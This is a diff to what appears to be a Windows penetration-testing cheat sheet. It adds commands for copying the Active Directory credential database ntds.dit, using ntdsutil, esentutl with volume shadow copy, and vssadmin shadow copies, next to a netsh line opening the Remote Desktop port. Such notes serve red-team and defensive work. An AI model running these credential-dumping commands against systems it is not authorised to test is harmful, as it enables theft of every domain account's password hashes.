@@ -457,9 +457,17 @@ netsh firewall add portopening TCP 3389 "Remote Desktop"
 ```
 
 % windows, ntds.dit
-## dump ntds.dit
+## dump ntds.dit (Windows >= 2008 server) - method 1
 ```
 ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
+```
+## dump ntds.dit (Windows >= 2008 server) - method 2
+```
+esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
+```
+## dump ntds.dit (Windows <= 2003 server)
+```
+net start vss && vssadmin create shadow /for=c: && vssadmin list shadows && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\temp
 ```
 
 % windows, smb, share
